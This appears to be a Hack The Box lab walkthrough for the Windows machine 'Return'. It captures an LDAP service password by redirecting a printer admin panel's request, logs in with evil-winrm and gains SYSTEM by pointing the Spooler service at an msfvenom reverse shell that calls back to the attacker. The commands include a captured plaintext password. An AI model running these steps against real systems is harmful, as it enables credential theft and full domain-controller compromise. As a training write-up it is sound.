---
description: https://app.hackthebox.com/machines/Return
---

# Return

## Nmap

```
nmap 10.10.11.108 -p- -sS -sV                  

PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-02-12 17:02:21Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
64370/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows
```

{% hint style="info" %}
Add "10.10.11.108 return.local" to /etc/hosts.
{% endhint %}

I ran through various standard Active Directory checks such as username and LDAP enumeration. I was not able to pick up results of interest.

Checking our port 80 we come to the root page "HTB Printer Admin Panel".

![](<../../../.gitbook/assets/image (357).png>)

We also have an a page of interest under `/settings.php`.

![](<../../../.gitbook/assets/image (2057) (1) (2).png>)

Looking through the PHP source code we are unable to identify anything of interest to us. Opening up ZAP proxy and running the default settings through the "Update" button we get the output below.

![](<../../../.gitbook/assets/image (399).png>)

We can see in the body of the POST request we have the target systems hostname. From here I set a `nc` listener on my attacking system to the port specified in the `/settings.php` page.

```bash
nc -lvp "127.0.0.1" -p "389"
```

Then edited the post request in ZAP Proxy to point back to my attacking system IP.

![](<../../../.gitbook/assets/image (459).png>)

And, after sending the request we are sent back a password for the account svc-printer.

![](<../../../.gitbook/assets/image (293).png>)

A quick test against `SMB` and `WinRM` with `crackmapexec` proves the credentials are valid.

![](<../../../.gitbook/assets/image (546) (2).png>)

From here we can use `Evil WinRM` to log in as the svc-printer user.

```
evil-winrm -u svc-printer -p '1edFg43012!!' -i 10.10.11.108
```

![](<../../../.gitbook/assets/image (547) (2).png>)

Now, with low level access on the Domain Controller we can look for path to privilege escalation. Doing some basic membership checks with `whoami /groups` shows we are a member of the "Server Operators" group.

**Server Operators:** [https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups)

![](<../../../.gitbook/assets/image (240).png>)

This group, gives user multiple interesting permissions. Namely, the ability to create, delete and reconfigure services.

The medium article below shows a good outline on how to use this to escalate privileges.

**URL:** [https://medium.com/@parvezahmad90/windows-privilege-escalation-insecure-service-registry-to-system-shell-step-by-step-88776c712c17](https://medium.com/@parvezahmad90/windows-privilege-escalation-insecure-service-registry-to-system-shell-step-by-step-88776c712c17)

On the target system at hand we will be doing this with the spooler service. We can use any server that is running in an elevated context however if we wish to.

First we double check the intended binary path for the spooler service.

```
reg query HKLM\system\currentcontrolset\services\Spooler /s  /v imagepath
```

We can then check the ACL's over the service. Below we see the owner is SYSTEM and the "Server Operators" group has the ability to "SetValue" which allows us to reconfigure the binary path.

```
get-acl HKLM:\system\currentcontrolset\services\Spooler | fl
```

![](<../../../.gitbook/assets/image (40) (2).png>)

On our attacking system we generate a x64 reverse shell executable.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 -f exe -o reverse.exe
```

Then transfer over to the target system with `Evil WinRM`.

![](<../../../.gitbook/assets/image (106).png>)

From here we can add a registry value that changes the binary path to the payload we just uploaded.

```
REG add HKLM\System\CurrentControlSet\Services\spooler /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\svc-printer\Documents\reverse.exe" /f
```

a `nc` listener is set on the attacking system.

```
sudo nc -lvp 443
```

Then a reboot is initiated on the target system. When the system reboots the Spooler service will come up and execute the reverse shell binary.

```
shutdown.exe -r -f -t 10
```

Landing us a SYSTEM shell.

![](<../../../.gitbook/assets/image (242).png>)
